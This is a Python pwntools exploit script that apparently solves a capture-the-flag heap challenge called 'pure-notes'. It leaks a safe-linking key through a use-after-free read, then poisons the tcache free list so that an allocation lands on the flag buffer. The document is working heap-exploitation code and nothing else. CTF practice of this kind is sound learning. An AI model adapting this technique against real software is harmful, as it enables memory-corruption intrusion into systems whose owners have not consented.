from pwn import *

context.log_level = 'info'
HOST = "pure-notes-b109f200db172955-global.challs.brunnerne.xyz"
PORT = 1337
SIZE = 128
OFFSET = 16  

MENU = (b"Commands:\n"
        b"  new NAME SIZE\n"
        b"  write NAME CONTENT\n"
        b"  writehex NAME CONTENT\n"
        b"  view NAME\n"
        b"  delete NAME\n"
        b"  list\n"
        b"  exit\n"
        b"> ")

def capture(p, line):
    p.sendline(line.encode())
    blob = p.recvuntil(MENU)
    assert blob.endswith(MENU)
    body = blob[:-len(MENU)]
    if body.endswith(b"\n\n"):
        body = body[:-2]
    elif body.endswith(b"\n"):
        body = body[:-1]
    return body


def decode_leaked(raw_utf8_bytes):
    s = raw_utf8_bytes.decode('utf-8', errors='strict')
    return s.encode('latin1')


def main():
    p = remote(HOST, PORT, ssl=True)
    p.recvuntil(b"program\n")
    target_addr = int(p.recvline().strip(), 16)
    log.success(f"flag buffer address: {hex(target_addr)}")
    p.recvuntil(b"> ")
    capture(p, f"new A {SIZE}")
    capture(p, "delete A")
    raw = capture(p, "view A")
    key_bytes = decode_leaked(raw)[:8].ljust(8, b'\x00')
    key = u64(key_bytes)
    log.info(f"leaked key (A_addr >> 12): {hex(key)}")
    capture(p, f"new C {SIZE}")
    capture(p, f"new B {SIZE}")
    capture(p, "delete B")
    capture(p, "delete C")
    redirect = target_addr - OFFSET
    encoded = key ^ redirect
    capture(p, f"writehex C {encoded.to_bytes(8,'little').hex()}")
    capture(p, f"new D {SIZE}")
    capture(p, f"new E {SIZE}")

    raw_flag = capture(p, "view E")
    flag_bytes = decode_leaked(raw_flag)[OFFSET:]
    log.success(f"flag: {flag_bytes!r}")

    capture(p, "exit")
    p.close()
    return flag_bytes


if __name__ == "__main__":
    main()